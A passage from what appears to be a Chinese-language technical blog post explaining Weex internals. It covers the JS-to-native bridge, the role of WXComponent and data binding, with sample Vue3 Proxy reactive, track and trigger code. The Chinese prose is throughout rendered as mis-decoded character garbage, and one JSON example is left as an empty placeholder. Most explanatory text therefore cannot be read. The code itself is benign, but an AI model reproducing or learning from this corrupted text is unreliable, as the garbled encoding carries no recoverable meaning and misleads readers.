<p>æºç ç›¸å…³ï¼šç¼–è¯‘è¿‡ç¨‹ä¸»è¦æ¶‰åŠ <code>weex-loader</code> (åœ¨ <code>weex-toolkit</code> é¡¹ç›®ä¸­)ï¼Œè€Œ JS Framework å¯¹ VNode çš„å¤„ç†åœ¨ <code>js-framework</code> ç›®å½•ä¸‹ã€‚é‡ç‚¹å…³æ³¨ <code>src/framework.js</code> ä¸­çš„ <code>Document</code> å’Œ <code>Element</code> ç±»ï¼Œå®ƒä»¬æ¨¡æ‹Ÿäº† DOM ç»“æ„</p>
<h3 data-id="heading-11">2. æŒ‡ä»¤ç”Ÿæˆä¸é€šä¿¡</h3>
<ul>
<li>
<p>åºåˆ—åŒ–ä¸ºæ¸²æŸ“æŒ‡ä»¤ï¼ˆjson æ•°æ®ï¼‰ï¼šJS-Framework ä¸ä¼šç›´æ¥æ“ä½œ Domï¼Œè€Œæ˜¯æŠŠå¯¹ Dom çš„æ“ä½œï¼Œæè¿°æˆå¯¹ VNode å¯¹è±¡çš„åˆ›å»ºã€æ›´æ–°ã€åˆ é™¤ç­‰ï¼Œåºåˆ—åŒ–æˆä¸€ç§ç‰¹æ®Šçš„ JSON æ ¼å¼çš„æ¸²æŸ“æŒ‡ä»¤ã€‚æ¯”å¦‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"dom"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"method"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"createBody"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"ref"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"div"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"style"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>...<span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
</li>
<li>
<p>JS-Native æ¡¥æ¥ï¼šè¿™äº›æŒ‡ä»¤é€šè¿‡ callNative æ–¹æ³•ï¼Œä» JS ç«¯å‘é€åˆ° Native ç«¯ï¼ŒåŒæ—¶ Native ç«¯ä¹Ÿå¯ä»¥é€šè¿‡ callJS æ–¹æ³•å‘ JS ç«¯å‘é€äº‹ä»¶ï¼ˆæ¯”å¦‚ç”¨æˆ·ç‚¹å‡»ï¼‰</p>
</li>
</ul>
<h3 data-id="heading-12">3. åŸç”Ÿç«¯æ¸²æŸ“</h3>
<ul>
<li>æŒ‡ä»¤è§£æä¸ç»„ä»¶æ¸²æŸ“ï¼šNative ç«¯çš„æ¸²æŸ“å¼•æ“ï¼ˆå¦‚ Android çš„ WXRenderManger å’Œ iOS çš„ WXComponentManagerï¼‰æ¥æ”¶å¹¶è§£æ JS æŒ‡ä»¤ã€‚Weex ç»´æŠ¤äº†ä¸€ä¸ªä» JS ç»„ä»¶åˆ°åŸç”Ÿ UI ç»„ä»¶çš„æ˜ å°„è¡¨ã€‚ï¼ˆä¾‹å¦‚  æ˜ å°„åˆ° iOS çš„ UILabelï¼‰</li>
<li>å¸ƒå±€ä¸æ ·å¼ï¼šWeex ä½¿ç”¨çš„ Flexbox å¸ƒå±€æ¨¡å‹åšä¸ºç»Ÿä¸€çš„å¸ƒå±€æ–¹æ¡ˆï¼ŒNative ç«¯éœ€è¦å°† JS ä¼ é€’çš„ css æ ·å¼å±æ€§ï¼Œè½¬æ¢ä¸ºåŸç”Ÿç»„ä»¶èƒ½å¤Ÿç†è§£çš„å¸ƒå±€å‚æ•°ä¸æ ·å¼å±æ€§ã€‚</li>
<li>å¤šçº¿ç¨‹æ¨¡å‹ï¼šä¸ºäº†ä¿è¯ UI æµç•…ï¼ŒWeex é‡‡ç”¨äº†å¤šçº¿ç¨‹æ¨¡å‹ã€‚DOM æ“ä½œå’Œå¸ƒå±€è®¡ç®—é€šå¸¸åœ¨å•ç‹¬çš„ DOM çº¿ç¨‹è¿›è¡Œï¼Œè€Œæœ€ç»ˆåˆ›å»ºå’Œæ›´æ–°åŸç”Ÿè§†å›¾çš„æ“ä½œå¿…é¡»åœ¨ UI ä¸»çº¿ç¨‹ä¸Šè¿›è¡Œ</li>
</ul>
<h3 data-id="heading-13">4. æ‹“å±•æœºåˆ¶</h3>
<ul>
<li>æ¨¡å—ï¼ˆModuleï¼‰ï¼šç”¨äºæš´éœ²åŸç”Ÿèƒ½åŠ›ï¼ˆå¦‚ç½‘ç»œã€å­˜å‚¨ï¼‰ç»™å‰ç«¯è°ƒç”¨ï¼Œé€šè¿‡ callNative è§¦å‘ï¼Œæ”¯æŒå›è°ƒ</li>
<li>ç»„ä»¶ï¼ˆComponentï¼‰ï¼šæ‹“å±•è‡ªå®šä¹‰ UI ç»„ä»¶ï¼Œå…è®¸å¼€å‘è€…åˆ›å»ºè‡ªå®šä¹‰çš„åŸç”Ÿ UI ç»„ä»¶ï¼Œå¹¶åœ¨ JSX ä¸­ä½¿ç”¨</li>
<li>é€‚é…å™¨ï¼ˆAdapterï¼‰ï¼šæä¾›å¯æ›¿æ¢çš„å®ç°ï¼Œå¦‚å›¾ç‰‡ä¸‹è½½å™¨</li>
</ul>
<h2 data-id="heading-14">å››ã€ä¸ºä»€ä¹ˆè‡ªå®šä¹‰ Component éƒ½éœ€è¦ç»§æ‰¿è‡ª WXComponentï¼Ÿ</h2>
<p>æ¯”å¦‚ä¸‹é¢çš„ä»£ç </p>
<pre><code class="hljs language-objective-c" lang="objective-c">[self registerComponent:@"image" withClass:NSClassFromString(@"WXImageComponent") withProperties:nil];

@interface WXImageComponent : WXComponent

@end
</code></pre>
<p>ç­”ï¼š<strong>è‡ªå®šä¹‰åŸç”Ÿç»„ä»¶å¿…é¡»ç»§æ‰¿è‡ª WXComponentï¼Œæœ¬è´¨æ˜¯å¤ç”¨ Weex å°è£…çš„ã€ŒJS - åŸç”Ÿäº¤äº’ã€ç”Ÿå‘½å‘¨æœŸã€æ ·å¼å¸ƒå±€ã€æ¸²æŸ“åŸºç¡€ã€ç­‰é€šç”¨èƒ½åŠ›ï¼Œç¡®ä¿ç»„ä»¶èƒ½æ¥å…¥ Weex è¿è¡Œæ—¶ç”Ÿæ€</strong>ã€‚</p>
<p>Weex Module ä¸ Componet çš„åŒºåˆ«</p>























<table><thead><tr><th>ç±»å‹</th><th>æ ¸å¿ƒä½œç”¨</th><th>åŸºç±»</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>Component</td><td>åŸç”Ÿ UI æ¸²æŸ“ï¼ˆæœ‰è§†å›¾ï¼‰</td><td><code>WXComponent</code></td><td><code>WXImageComponent</code>ï¼ˆå›¾ç‰‡ï¼‰ã€<code>WXTextComponent</code>ï¼ˆæ–‡æœ¬ï¼‰ã€è‡ªå®šä¹‰æŒ‰é’®ç»„ä»¶</td></tr><tr><td>Module</td><td>åŠŸèƒ½æ‰©å±•ï¼ˆæ— è§†å›¾ï¼‰</td><td><code>WXModule</code></td><td><code>WXNavigatorModule</code>ï¼ˆå¯¼èˆªï¼‰ã€<code>WXStorageModule</code>ï¼ˆå­˜å‚¨ï¼‰ã€è‡ªå®šä¹‰å·¥å…·æ¨¡å—</td></tr></tbody></table>
<p>å®ç° JS ä¸åŸç”Ÿç»„ä»¶çš„ã€Œæ•°æ®åŒæ­¥ã€ï¼ˆå±æ€§ã€äº‹ä»¶ã€æ–¹æ³•ï¼‰</p>
<p>Weex çš„æ ¸å¿ƒæ˜¯ã€ŒJS æ§åˆ¶åŸç”Ÿç»„ä»¶ã€ï¼Œè€Œ <code>WXComponent</code> å°è£…äº† JS ä¸åŸç”Ÿä¹‹é—´çš„é€šä¿¡åè®®ï¼Œæ— éœ€è‡ªå®šä¹‰ç»„ä»¶æ‰‹åŠ¨å¤„ç†ï¼š</p>
<ul>
<li>
<p>å±æ€§åŒæ­¥ï¼ˆPropsï¼‰ï¼šJS ç«¯é€šè¿‡ <code>&lt;my-component prop1="xxx" prop2="yyy"&gt;</code> ä¼ é€’çš„å±æ€§ï¼ŒWXComponent ä¼šè‡ªåŠ¨è§£æã€ç±»å‹è½¬æ¢ï¼ˆå¦‚ JS å­—ç¬¦ä¸² â†’ åŸç”Ÿ NSString/NSNumberï¼‰ï¼Œå¹¶é€šè¿‡ <code>setter</code> æ–¹æ³•åŒæ­¥åˆ°è‡ªå®šä¹‰ç»„ä»¶ã€‚</p>
<p>ç¤ºä¾‹ï¼šWXImageComponent ç»§æ‰¿ <code>WXComponent</code> åï¼Œåªéœ€é‡å†™ <code>-setSrc:(NSString*)src</code> æ–¹æ³•ï¼Œå°±èƒ½æ¥æ”¶ JS ä¼ çš„ <code>src</code> å±æ€§ï¼Œæ— éœ€å…³å¿ƒã€ŒJS å¦‚ä½•æŠŠå€¼ä¼ ç»™åŸç”Ÿã€ã€‚</p>
</li>
<li>
<p>äº‹ä»¶åˆ†å‘ï¼ˆEventsï¼‰ï¼šåŸç”Ÿç»„ä»¶çš„äº¤äº’äº‹ä»¶ï¼ˆå¦‚ç‚¹å‡»ã€åŠ è½½å®Œæˆï¼‰ï¼Œ<code>WXComponent</code> ä¼šæŒ‰ç…§ Weex åè®®å›ä¼ ç»™ JS ç«¯ï¼ˆå¦‚ <code>@emit('click')</code> )</p>
<p>ç¤ºä¾‹ï¼šè‡ªå®šä¹‰æŒ‰é’®ç»„ä»¶ç»§æ‰¿åï¼Œåªéœ€è°ƒç”¨ <code>[self fireEvent:@"click" params:@{@"x": @100, @"y": @200}]</code> ï¼ŒJS ç«¯å°±èƒ½é€šè¿‡ <code>@onclick</code>æ¥æ”¶äº‹ä»¶ï¼Œæ— éœ€è‡ªå·±å®ç°äº‹ä»¶é€šä¿¡ã€‚</p>
</li>
<li>
<p>æ–¹æ³•è°ƒç”¨ï¼ˆMethodsï¼‰ï¼šJS ç«¯é€šè¿‡ <code>this.$refs.myComponent.callMethod('xxx', params)</code> è°ƒç”¨åŸç”Ÿç»„ä»¶æ–¹æ³•ï¼Œ<code>WXComponent</code></p>
<p>ä¼šè§£ææ–¹æ³•åå’Œå‚æ•°ï¼Œåå°„è°ƒç”¨è‡ªå®šä¹‰ç»„ä»¶çš„å¯¹åº”æ–¹æ³•ã€‚</p>
<p>ç¤ºä¾‹ï¼šè‡ªå®šä¹‰æ’­æ”¾å™¨ç»„ä»¶ç»§æ‰¿åï¼Œåªéœ€æš´éœ² <code>-play</code>æ–¹æ³•ï¼ŒJS å°±èƒ½ç›´æ¥è°ƒç”¨ï¼Œ<code>WXComponent</code>è´Ÿè´£æ–¹æ³•æŸ¥æ‰¾å’Œå‚æ•°ä¼ é€’ã€‚</p>
</li>
</ul>
<h2 data-id="heading-15">äº”ã€JS æ•°æ®å˜åŒ–æ˜¯å¦‚ä½•é©±åŠ¨ Native UI æ›´æ–°çš„</h2>
<p>çº¯ Web ç«¯çš„æ•°æ®å˜åŒ–ä¼šé€šè¿‡ Proxy å»é©±åŠ¨å…³è”çš„ UI æ›´æ–°ï¼Œè¿™ä¹Ÿæ˜¯ Vue3 çš„å·¥ä½œåŸç†ï¼Œé‚£ä¹ˆ JS ç«¯çš„æ•°æ®å˜åŒ–æ˜¯å¦‚ä½•é©±åŠ¨ Native UI ç»„ä»¶çš„æ›´æ–°çš„ï¼Ÿ</p>
<p>æ‰€æœ‰çš„ Native UI Component éƒ½ç»§æ‰¿è‡ª WXComponentï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç»™ WXComponent æ·»åŠ ä¸€ä¸ªå®ç° DataBinding çš„ Categoryï¼Œè¿™å°±æ˜¯ Weex æœ€æ–°æºç ä¸­çš„ <code>WXComponent+DataBinding.mm</code></p>
<p>æ ¸å¿ƒæ˜¯ï¼š<strong>è§£æ JS ç«¯ä¼ é€’çš„ã€Œç»‘å®šè¡¨è¾¾å¼ã€ï¼ˆå¦‚ <code>{{a + b}}</code>ï¼‰ï¼Œç¼–è¯‘ä¸ºåŸç”Ÿå¯æ‰§è¡Œçš„å›è°ƒ Blockï¼Œå½“ JS æ•°æ®å˜åŒ–æ—¶ï¼Œé€šè¿‡ Block è®¡ç®—å‡ºç»„ä»¶æ‰€éœ€çš„æ–°å€¼ï¼Œè‡ªåŠ¨æ›´æ–°ç»„ä»¶çš„å±æ€§ã€æ ·å¼ã€äº‹ä»¶ï¼Œæˆ–å¤„ç†åˆ—è¡¨ï¼ˆ<code>v-for</code>ï¼‰ã€æ¡ä»¶ï¼ˆ<code>v-if</code>ï¼‰ã€ä¸€æ¬¡æ€§ç»‘å®šï¼ˆ<code>v-once</code>ï¼‰ç­‰é€»è¾‘</strong></p>
<p>å¯èƒ½æœ‰äº›äººè¦é—®äº†ï¼šä¸ºä»€ä¹ˆå½“ js æ•°æ®å˜åŒ–æ—¶ï¼Œéœ€è¦è®© Native è®¡ç®—ç»„ä»¶æ‰€éœ€çš„æ–°å€¼ï¼Ÿè¿™ä¸å°±æ˜¯ Native åšäº†ä¸€é Vue å“åº”å¼çš„é€»è¾‘å—ï¼Ÿè¿™ç§é‡å¤é€»è¾‘çš„ä»·å€¼æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p><strong>Vue3 çš„ Proxy åªè´Ÿè´£ã€ŒJS ç«¯æ•°æ®å˜åŒ–çš„ç›‘å¬ + ä¾èµ–æ”¶é›† + è§¦å‘æ›´æ–°é€šçŸ¥ã€â€”â€” å®ƒæ˜¯ â€œå“åº”å¼çš„è§¦å‘å™¨â€ï¼Œè€Œé â€œUI æ›´æ–°çš„æ‰§è¡Œè€…â€</strong></p>
<p>è€Œ Weex ä¹‹æ‰€ä»¥éœ€è¦ Native æ‰˜ç®¡ï¼Œæ ¸å¿ƒæ˜¯å› ä¸ºã€Œç»§æ‰¿è‡ª WXComponent çš„ UI ç»„ä»¶æ˜¯ Native ä¾§çš„åŸç”Ÿç»„ä»¶ï¼Œè€Œé DOM ç»„ä»¶ã€ï¼ŒJS ç«¯æ²¡æœ‰ä»»ä½•èƒ½åŠ›ï¼ˆAPIï¼‰å»è®¿é—®ã€æ“ä½œä»–ä»¬ï¼ŒProxy å†å¼ºå¤§ï¼Œå®ƒä¹Ÿåªæ˜¯ Native ä¾§ï¼ˆWeexï¼‰å’Œ Web ç«¯ï¼ˆVueï¼‰è´Ÿè´£â€œå–Šä¸€å£°ï¼Œå“ï¼Œæ•°æ®å˜äº†ï¼Œä½ ä»¬è°éœ€è¦çš„è‡ªåŠ©ï¼Œè‡ªå·±å»å¤„ç†æ„Ÿå…´è¶£çš„ UIâ€ï¼Œå´æ‘¸ä¸åˆ° UI ç»„ä»¶ï¼ŒWeb ç«¯ç”± DOM API å»æ¸²æŸ“ç»˜åˆ¶ï¼ŒNative ç«¯æ›´è§¦ç¢°ä¸åˆ°ï¼Œå¿…é¡»ç”± Native è‡ªå·±æ¥å®Œæˆï¼šå¬åˆ°é€šçŸ¥ -&gt; è®¡ç®—æ–°å€¼ -&gt; æ›´æ–°æ§ä»¶çš„æµç¨‹ã€‚</p>
<h3 data-id="heading-16">1. Proxy éƒ½åšäº†äº›ä»€ä¹ˆï¼Ÿ</h3>
<p>Vue3 çš„æ ¸å¿ƒå®ç°é‡Œ Proxy åšäº†3ä»¶äº‹ï¼šå…¨ç¨‹åœ¨ JS ä¾§ï¼Œä¸æ¶‰åŠä»»ä½• UI æ“ä½œ</p>
<p>ç›‘å¬æ•°æ®æ“ä½œï¼šé€šè¿‡ Proxy ä»£ç†å¯¹è±¡æ‹¦æˆªæ•°æ®çš„ getterã€setter</p>
<ul>
<li>é€šè¿‡ getter æ”¶é›†ä¾èµ–å…³ç³»ï¼šå½“ç»„ä»¶æ¸²æŸ“æ—¶è§¦å‘ getterï¼ŒProxy ä¼šè®°å½•è¿™ä¸ªç»„ä»¶ä¾èµ–äº†è¿™ä¸ªæ•°æ®</li>
<li>é€šè¿‡ setter è§¦å‘æ›´æ–°é€šçŸ¥ï¼šå½“æ•°æ®è¢«ä¿®æ”¹æ—¶è§¦å‘ setterï¼ŒProxy ä¼šå‘Šè¯‰ Vue è¿è¡Œæ—¶ï¼Œâ€œuser.nameâ€ å˜äº†ï¼Œæ‰€æœ‰ä¾èµ–å®ƒçš„ç»„ä»¶è¯¥æ›´æ–°äº†</li>
</ul>
<p>Proxyï¼ˆä»£ç†ï¼‰æ˜¯ ES6 æ–°å¢çš„å†…ç½®å¯¹è±¡ï¼Œç”¨äº<strong>åˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„ä»£ç†å‰¯æœ¬</strong>ï¼Œå¹¶é€šè¿‡ã€Œé™·é˜±ï¼ˆTrapï¼‰ã€æ‹¦æˆªå¯¹åŸå¯¹è±¡çš„åŸºæœ¬æ“ä½œï¼ˆå¦‚å±æ€§è®¿é—®ã€èµ‹å€¼ã€åˆ é™¤ç­‰ï¼‰ï¼Œä»è€Œè‡ªå®šä¹‰è¿™äº›æ“ä½œçš„è¡Œä¸ºã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler);
</code></pre>
<ul>
<li><code>target</code>ï¼šè¢«ä»£ç†çš„<strong>åŸå§‹å¯¹è±¡</strong>ï¼ˆå¯ä»¥æ˜¯å¯¹è±¡ã€æ•°ç»„ï¼Œç”šè‡³å‡½æ•°ï¼‰ï¼›</li>
<li><code>handler</code>ï¼šé…ç½®å¯¹è±¡ï¼ŒåŒ…å«å¤šä¸ªã€Œé™·é˜±æ–¹æ³•ã€ï¼ˆå¦‚ <code>get</code>ã€<code>set</code>ï¼‰ï¼Œç”¨äºå®šä¹‰æ‹¦æˆªé€»è¾‘ï¼›</li>
<li><code>proxy</code>ï¼šä»£ç†å¯¹è±¡ï¼Œåç»­å¯¹åŸå§‹å¯¹è±¡çš„æ“ä½œéœ€é€šè¿‡ä»£ç†å¯¹è±¡è¿›è¡Œï¼Œæ‰èƒ½è§¦å‘æ‹¦æˆªã€‚</li>
</ul>






























<table><thead><tr><th>é™·é˜±æ–¹æ³•</th><th>ä½œç”¨</th><th>è§¦å‘åœºæ™¯</th></tr></thead><tbody><tr><td><code>get(target, key, receiver)</code></td><td>æ‹¦æˆªã€Œå±æ€§è®¿é—®ã€</td><td><code>proxy.key</code> æˆ– <code>proxy[key]</code></td></tr><tr><td><code>set(target, key, value, receiver)</code></td><td>æ‹¦æˆªã€Œå±æ€§èµ‹å€¼ã€</td><td><code>proxy.key = value</code> æˆ– <code>proxy[key] = value</code></td></tr><tr><td><code>deleteProperty(target, key)</code></td><td>æ‹¦æˆªã€Œå±æ€§åˆ é™¤ã€</td><td><code>delete proxy.key</code></td></tr><tr><td><code>has(target, key)</code></td><td>æ‹¦æˆªã€Œ<code>in</code> è¿ç®—ç¬¦åˆ¤æ–­ã€</td><td><code>key in proxy</code></td></tr></tbody></table>
<p>Tips: Proxy ä»£ç†çš„æ˜¯ã€Œæ•´ä¸ªå¯¹è±¡ã€ï¼Œè€Œéå•ä¸ªå±æ€§ï¼Œä¸”æ‹¦æˆªçš„æ˜¯ã€Œæ“ä½œè¡Œä¸ºã€ï¼ˆå¦‚ â€œè®¿é—®å±æ€§â€ è¿™ä¸ªåŠ¨ä½œï¼‰ï¼Œè€Œéå±æ€§æœ¬èº«ã€‚</p>
<p>Vue æ ¸å¿ƒæµç¨‹ï¼š<strong>åˆ›å»ºä»£ç† â†’ ä¾èµ–æ”¶é›† â†’ æ•°æ®ä¿®æ”¹ â†’ è§¦å‘æ›´æ–°</strong>ã€‚</p>
<h4 data-id="heading-17">1. åˆ›å»ºä»£ç†ï¼ˆreactive å‡½æ•°çš„æ ¸å¿ƒï¼‰</h4>
<p><code>reactive</code> å‡½æ•°æ¥æ”¶ä¸€ä¸ªåŸå§‹å¯¹è±¡ï¼Œè¿”å›å…¶ Proxy ä»£ç†å¯¹è±¡ï¼ŒåŒæ—¶é…ç½® <code>get</code>ã€<code>set</code> ç­‰é™·é˜±æ–¹æ³•ï¼Œä¸ºåç»­ä¾èµ–æ”¶é›†å’Œæ›´æ–°åšå‡†å¤‡</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">reactive</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, {
    <span class="hljs-comment">// æ‹¦æˆªå±æ€§è®¿é—®</span>
    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key, receiver</span>) {
      <span class="hljs-comment">// 1. å…ˆè·å–åŸå§‹å±æ€§å€¼</span>
      <span class="hljs-keyword">const</span> value = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver);
      <span class="hljs-comment">// 2. æ”¶é›†ä¾èµ–ï¼ˆå…³é”®ï¼šè®°å½•â€œè°åœ¨è®¿é—®è¿™ä¸ªå±æ€§â€ï¼‰</span>
      <span class="hljs-title function_">track</span>(target, key);
      <span class="hljs-comment">// 3. è‹¥è®¿é—®çš„æ˜¯åµŒå¥—å¯¹è±¡ï¼Œé€’å½’åˆ›å»ºä»£ç†ï¼ˆæ‡’ä»£ç†ï¼Œä¼˜åŒ–æ€§èƒ½ï¼‰</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span> &amp;&amp; value !== <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">reactive</span>(value);
      }
      <span class="hljs-keyword">return</span> value;
    },
    <span class="hljs-comment">// æ‹¦æˆªå±æ€§èµ‹å€¼</span>
    <span class="hljs-title function_">set</span>(<span class="hljs-params">target, key, value, receiver</span>) {
      <span class="hljs-comment">// 1. å…ˆè®¾ç½®åŸå§‹å±æ€§å€¼</span>
      <span class="hljs-keyword">const</span> oldValue = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver);
      <span class="hljs-keyword">const</span> success = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, key, value, receiver);
      <span class="hljs-comment">// 2. è‹¥å€¼å‘ç”Ÿå˜åŒ–ï¼Œè§¦å‘ä¾èµ–æ›´æ–°</span>
      <span class="hljs-keyword">if</span> (success &amp;&amp; oldValue !== value) {
        <span class="hljs-title function_">trigger</span>(target, key);
      }
      <span class="hljs-keyword">return</span> success;
    },
    <span class="hljs-comment">// æ‹¦æˆªå±æ€§åˆ é™¤</span>
    <span class="hljs-title function_">deleteProperty</span>(<span class="hljs-params">target, key</span>) {
      <span class="hljs-keyword">const</span> success = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">deleteProperty</span>(target, key);
      <span class="hljs-keyword">if</span> (success) {
        <span class="hljs-title function_">trigger</span>(target, key); <span class="hljs-comment">// åˆ é™¤å±æ€§ä¹Ÿè§¦å‘æ›´æ–°</span>
      }
      <span class="hljs-keyword">return</span> success;
    }
  });
}
</code></pre>
<ul>
<li>ç”¨ <code>Reflect</code> æ“ä½œåŸå§‹å¯¹è±¡ï¼ŒReflect æ˜¯ ES6 æ–°å¢çš„å†…ç½®å¯¹è±¡ï¼Œæä¾›äº†ä¸ Proxy é™·é˜±å¯¹åº”çš„æ–¹æ³•ï¼Œæ¯”å¦‚ <code>Relect.get</code>ã€<code>Reflect.set</code> ç¡®ä¿æ“ä½œåŸå§‹å¯¹è±¡çš„è¡Œä¸ºä¸€ç›´ï¼ŒåŒæ—¶é¿å…ç›´æ¥æ“ä½œ target æ‰€äº§ç”Ÿçš„é—®é¢˜</li>
<li>åµŒå¥—å¯¹è±¡æ‡’ä»£ç†ï¼šProxy ä»…ä»£ç†å½“å‰å±‚çº§å¯¹è±¡ï¼Œå½“è®¿é—®åµŒå¥—å¯¹è±¡ ï¼ˆproxy.user.nameï¼‰æ—¶ï¼Œæ‰é€’å½’å¯¹ user å¯¹è±¡åˆ›å»ºä»£ç†ï¼Œé¿å…åˆå§‹åŒ–æ—¶é€’å½’éå†æ‰€æœ‰å±æ€§ï¼Œä¼˜åŒ–æ€§èƒ½</li>
</ul>
<h4 data-id="heading-18">2. ä¾èµ–æ”¶é›†</h4>
<p>Vue3 ç”¨ã€Œä¸‰å±‚æ˜ å°„ã€å­˜å‚¨ä¾èµ–ï¼Œç¡®ä¿ç²¾å‡†å®šä½</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// WeakMapï¼škey æ˜¯è¢«ä»£ç†çš„åŸå§‹å¯¹è±¡ï¼ˆtargetï¼‰ï¼Œvalue æ˜¯è¯¥å¯¹è±¡çš„å±æ€§-ä¾èµ–æ˜ å°„</span>
<span class="hljs-keyword">const</span> targetMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();

<span class="hljs-keyword">function</span> <span class="hljs-title function_">track</span>(<span class="hljs-params">target, key</span>) {
  <span class="hljs-comment">// 1. è‹¥æ²¡æœ‰å½“å‰ç›®æ ‡å¯¹è±¡çš„æ˜ å°„ï¼Œåˆ›å»ºä¸€ä¸ªï¼ˆMapï¼škey æ˜¯å±æ€§åï¼Œvalue æ˜¯ä¾èµ–é›†åˆï¼‰</span>
  <span class="hljs-keyword">if</span> (!targetMap.<span class="hljs-title function_">has</span>(target)) {
    targetMap.<span class="hljs-title function_">set</span>(target, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>());
  }
  <span class="hljs-keyword">const</span> depsMap = targetMap.<span class="hljs-title function_">get</span>(target);

  <span class="hljs-comment">// 2. è‹¥æ²¡æœ‰å½“å‰å±æ€§çš„ä¾èµ–é›†åˆï¼Œåˆ›å»ºä¸€ä¸ªï¼ˆSetï¼šå­˜å‚¨ä¾èµ–å‡½æ•°ï¼Œå»é‡ï¼‰</span>
  <span class="hljs-keyword">if</span> (!depsMap.<span class="hljs-title function_">has</span>(key)) {
    depsMap.<span class="hljs-title function_">set</span>(key, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());
  }
  <span class="hljs-keyword">const</span> deps = depsMap.<span class="hljs-title function_">get</span>(key);

  <span class="hljs-comment">// 3. å°†å½“å‰æ´»è·ƒçš„ä¾èµ–å‡½æ•°ï¼ˆeffectï¼‰æ·»åŠ åˆ°é›†åˆä¸­</span>
  <span class="hljs-keyword">if</span> (activeEffect) {
    deps.<span class="hljs-title function_">add</span>(activeEffect);
  }
}
</code></pre>
<p>ä¼šäº§ç”Ÿä¸€ä¸ªè¿™æ ·çš„ç»“æ„</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
	<span class="hljs-string">""</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-19">3. æ•°æ®ä¿®æ”¹ï¼ˆè§¦å‘ set/deleteProperty çš„é™·é˜±ï¼‰</h4>
<p>å½“é€šè¿‡ä»£ç†å¯¹è±¡ä¿®æ”¹å±æ€§ï¼ˆå¦‚ <code>proxy.name = 'newName'</code>ï¼‰æˆ–åˆ é™¤å±æ€§ï¼ˆå¦‚ <code>delete proxy.age</code>ï¼‰æ—¶ï¼Œä¼šè§¦å‘å¯¹åº”çš„ Proxy é™·é˜±ï¼ˆ<code>set</code> æˆ– <code>deleteProperty</code>ï¼‰ã€‚</p>
<p>é™·é˜±å‡½æ•°ä¼šå…ˆæ›´æ–°åŸå§‹å¯¹è±¡çš„å±æ€§å€¼ï¼Œå†åˆ¤æ–­å€¼æ˜¯å¦çœŸçš„å‘ç”Ÿå˜åŒ–ï¼ˆé¿å…æ— æ•ˆæ›´æ–°ï¼‰</p>
<h4 data-id="heading-20">4. è§¦å‘æ›´æ–° ï¼ˆtigger å‡½æ•°ï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">target, key</span>) {
  <span class="hljs-comment">// 1. ä» targetMap ä¸­è·å–å½“å‰å¯¹è±¡çš„å±æ€§-ä¾èµ–æ˜ å°„</span>
  <span class="hljs-keyword">const</span> depsMap = targetMap.<span class="hljs-title function_">get</span>(target);
  <span class="hljs-keyword">if</span> (!depsMap) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// 2. è·å–å½“å‰å±æ€§çš„æ‰€æœ‰ä¾èµ–</span>
  <span class="hljs-keyword">const</span> deps = depsMap.<span class="hljs-title function_">get</span>(key);
  <span class="hljs-keyword">if</span> (!deps) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// 3. æ‰§è¡Œæ‰€æœ‰ä¾èµ–å‡½æ•°ï¼ˆè§¦å‘æ›´æ–°ï¼‰</span>
  deps.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> <span class="hljs-title function_">effect</span>());
}
</code></pre>
<h3 data-id="heading-21">2. Proxy ä¸åšçš„äº‹æƒ…</h3>
<ul>
<li>ä¸è®¡ç®—è¡¨è¾¾å¼ï¼ˆæ¯”å¦‚ user.name + "åç¼€"çš„ç»“æœï¼ŒProxy ä¸ç®¡ï¼‰</li>
<li>ä¸æ“ä½œ UIï¼ˆä¸ç®¡æ˜¯ DOM å’Œ Native æ§ä»¶ï¼ŒProxy éƒ½ä¸ç¢°ï¼‰</li>
<li>ä¸è·¨ç«¯é€šä¿¡</li>
</ul>
